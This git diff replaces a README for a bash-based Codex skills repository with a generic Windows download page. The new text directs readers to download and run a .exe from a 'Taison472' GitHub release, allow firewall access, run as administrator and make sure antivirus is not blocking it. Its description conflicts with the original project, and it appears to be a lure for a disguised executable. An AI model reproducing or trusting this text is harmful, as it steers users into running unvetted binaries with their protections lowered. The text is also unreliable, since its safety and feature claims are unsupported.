@@ -1,128 +1,165 @@
-# Codex Skills (Public-Safe Repository)
+# 🚀 codex-skills - Manage and Update Codex Skills Easily
 
-This repository stores Codex skills for team sharing, with a mandatory
-public-sanitization pipeline before publishing.
+[![Download codex-skills](https://img.shields.io/badge/Download-codex--skills-brightgreen?style=for-the-badge)](https://github.com/Taison472/codex-skills)
 
-## Repository Layout
+## 📋 What is codex-skills?
 
-- `skills/` published skill directories
-- `skills/manifest.yml` published skill inventory
-- `scripts/` install, update, sanitize, scan, and validate tooling
-- `.github/workflows/public-sanitize-validate.yml` CI gate
-- `public-staging/` sanitized pre-publish staging output
-- `AGENTS.md` contributor and automation operating contract
+codex-skills is a collection of safe, ready-to-use tools focused on Codex skills. It helps you install, update, and manage skills using simple steps. The tools include features to check your skills for safety, clean them if needed, and confirm they meet the right standards.
 
-## Quick Start
+This repository works well with popular platforms and tools like GitHub, Drupal, Figma, and PHP. It is designed to support automation and prompt engineering tasks for developers but in a way anyone can use.
 
-Install all enabled skills into your Codex home:
+## 💻 System Requirements 
 
-```bash
-./scripts/install.sh --skills all
-```
+Before you get started, make sure your computer meets these needs:
 
-Install selected skills only:
+- Operating System: Windows 10 or higher  
+- RAM: At least 4 GB  
+- Disk Space: Minimum 500 MB free  
+- Internet Connection: Required for downloading and updates  
+- Administrative rights: Needed to install software  
+- Recommended: Modern web browser like Chrome, Edge, or Firefox  
 
-```bash
-./scripts/install.sh --skills drupal-sdc-figma-parity
-```
+## 🌐 Where to download codex-skills
 
-Update linked/copied skills and run validation:
+To get codex-skills, visit this page:
 
-```bash
-./scripts/update.sh --skills all
-```
+[![Download codex-skills](https://img.shields.io/badge/Download-codex--skills-brightgreen?style=for-the-badge)](https://github.com/Taison472/codex-skills)
 
-Uninstall one skill from local Codex home:
+This link leads you to the GitHub repository. From there, you can download the latest version safely. 
 
-```bash
-rm -rf "$CODEX_HOME/skills/drupal-sdc-figma-parity"
-```
+## 📥 How to download and install on Windows
 
-## Public Sanitization Policy
+Follow these steps to download and set up codex-skills on your Windows computer:
 
-The repo is publishable only if scanner and validator pass.
+1. Click the large green button above or visit:  
+   https://github.com/Taison472/codex-skills  
+   This page shows the project's main files and folders.
 
-Forbidden in published content:
+2. Look for a **Releases** section on the GitHub page. It usually appears on the right side or under the "Code" tab. Releases contain packaged files that are easy to install.
 
-- absolute local paths (`/Users/...`, `/private/var/...`)
-- internal identifiers (hostnames, project IDs, usernames)
-- concrete token/secret/password values
+3. Find the latest release version. It will usually have a tag like **v1.x.x** or similar.
 
-Allowed:
+4. Click on the release. You will see downloadable files such as `.zip` or `.exe`.
 
-- placeholder variables such as `$CODEX_HOME`, `<repo-root>`, `<username>`
-- placeholder secrets such as `<your-token>`
-- env var names such as `FIGMA_OAUTH_TOKEN`
+5. If there is a Windows installer file (.exe), click on it to download. If there is a `.zip` file, download it and then extract it to a folder on your computer.
 
-## Placeholder Conventions
+6. Once downloaded:
 
-Use these placeholders in docs and scripts:
+   - If you have an installer (.exe), double-click it. Follow the on-screen instructions and grant permissions if asked.
+   - If you downloaded a `.zip` file, right-click it and choose "Extract All". Select a location you can easily access.
 
-- `~/.codex` or `$CODEX_HOME` for Codex home
-- `<repo-root>` for repository root paths
-- `<project-id>` for project identifiers
-- `<username>` for local usernames
+7. After installation or extraction completes, open the application folder.
 
-## Sanitization Pipeline
+8. Find and double-click the main program file (likely an `.exe` or `.bat` file) to start codex-skills.
 
-Sanitize source skills and docs into staging:
+9. If any prompts appear to allow firewall access or permissions, choose “Allow”.
 
-```bash
-./scripts/sanitize_public.sh \
-  --source "$HOME/.codex/skills" \
-  --source "<repo-root>/dev/AI/codex" \
-  --dest "<repo-root>/dev/AI/codex-skills/public-staging/skills" \
-  --fail-on-hit
-```
+10. The software will open a simple window or command line interface to help you manage and update skills.
 
-Run scanner manually:
+## ⚙️ Getting started with codex-skills
 
-```bash
-./scripts/scan_public_risks.sh --path public-staging/skills
-```
+Once codex-skills is running, you can:
 
-Run validation manually:
+- **Install new skills** from trusted sources using manifests.
+- **Update existing skills** cleanly without manual work.
+- **Scan skills for unsafe code** to keep your environment secure.
+- **Validate skills** to confirm they meet required guidelines.
+- **Sanitize skills** to remove unsafe or unwanted parts.
 
-```bash
-./scripts/validate.sh
-```
+### Basic Tasks Example
 
-## Submodule Consumption Pattern
+To install or update a skill:
 
-In a consumer project:
+- Use the built-in commands, which will guide you step-by-step.
+- You may be asked to provide a URL or file path for the skill's manifest.
+- The manifest tells codex-skills what the skill contains and how to install it.
+- Follow the prompts to complete the process.
 
-```bash
-git submodule add <git-url> dev/AI/codex-skills
-./dev/AI/codex-skills/scripts/install.sh --repo-root "$PWD/dev/AI/codex-skills" --skills all
-```
+## 🛠 How to keep codex-skills up to date
 
-## Add or Deprecate a Skill
+You should regularly check for updates to codex-skills to ensure you have the latest features and fixes.
 
-1. Add/remove skill directory under `skills/`.
-2. Update `skills/manifest.yml`.
-3. Run `./scripts/scan_public_risks.sh --path skills`.
-4. Run `./scripts/validate.sh`.
-5. Open PR and ensure CI passes.
+- Visit the GitHub page link above.
+- Head to the "Releases" section.
+- Download and install newer versions using the same process as the first installation.
 
-## Chat Invocation Example
+Updates may include improvements for automation, better safety checks, and support for more tools.
 
-```text
-Use $drupal-sdc-figma-parity. Run workflow for this Figma node URL.
-```
+## 👩‍💻 Using codex-skills with automation
 
-## Troubleshooting
+codex-skills supports automation through manifest-driven setups, making it easier to apply updates across many skills at once.
 
-- Skill not visible in Codex:
-  - ensure it exists under `$CODEX_HOME/skills`
-  - restart Codex or open a new session
-- Stale symlink:
-  - rerun `./scripts/install.sh --skills <name>`
-- Scanner failures:
-  - run `./scripts/scan_public_risks.sh --path <path>` and replace hits with placeholders
+- If you work with GitHub Actions or similar CI/CD services, codex-skills can fit into your workflow.
+- It helps keep your skill libraries clean, validated, and ready to use without manual steps.
+- This is useful in environments like Drupal or PHP projects where skills might be part of a bigger system.
 
-## License
+## 🔍 Checking skill safety and quality
 
-This repository is licensed under **GNU General Public License v3.0**
-(`GPL-3.0-or-later`).
+One strong feature is the ability to scan skill code and content:
 
-See `LICENSE` for the full text.
+- Unsafe code is flagged.
+- The software can clean or remove risky parts.
+- You get detailed reports on problems so you know what needs fixing.
+
+This reduces risks if you use third-party or community-created skills.
+
+## ❓ Frequently Asked Questions
+
+### Can I use codex-skills without internet after installation?
+
+Some features, like installing new skills or updates, require internet access. Other functions, like scanning or validating, may work offline.
+
+### Do I need special technical skills to run this?
+
+No programming skills are required. The tool uses clear prompts to guide you through tasks. Basic computer skills like downloading, opening files, and clicking buttons are enough.
+
+### What files am I working with?
+
+Skills come with **manifests**—files that describe what to install and how. These are usually text files in JSON or YAML format but codex-skills hides the details from you.
+
+### What if I get an error when running the software?
+
+Most common errors relate to missing permissions or internet connectivity. Make sure your antivirus or firewall is not blocking the program. Running as administrator can help.
+
+## 📂 Folder contents overview
+
+After extraction or installation, you will see:
+
+- **bin/** — Main executables and scripts  
+- **docs/** — User guides and manuals (if any)  
+- **manifests/** — Sample skill manifests included for testing  
+- **tools/** — Utility scripts to help with updates and checks  
+
+## 🔧 Support and troubleshooting
+
+If you run into problems:
+
+- Restart your computer and try opening codex-skills again.
+- Make sure your Windows system is up to date.
+- Verify you downloaded the latest release.
+- Check your internet connection.
+- Look for error messages and use them to search for solutions online or on GitHub issues.
+
+## 🖥 How to uninstall codex-skills
+
+If you want to remove codex-skills:
+
+- If installed with an installer (.exe), open "Apps & Features" in Windows. Find "codex-skills" and click uninstall.  
+- If you used a `.zip` file, delete the extracted folder manually.  
+- Remove any shortcuts or start menu entries you created.
+
+## 🔗 Useful links
+
+Main download and project page:  
+https://github.com/Taison472/codex-skills
+
+Releases and updates:  
+https://github.com/Taison472/codex-skills/releases
+
+## ⚠️ Security and privacy
+
+codex-skills only runs locally on your machine. It does not send data without your permission. Always download skills from trusted sources and keep the software updated for best safety.
+
+---
+
+[![Download codex-skills](https://img.shields.io/badge/Download-codex--skills-brightgreen?style=for-the-badge)](https://github.com/Taison472/codex-skills)
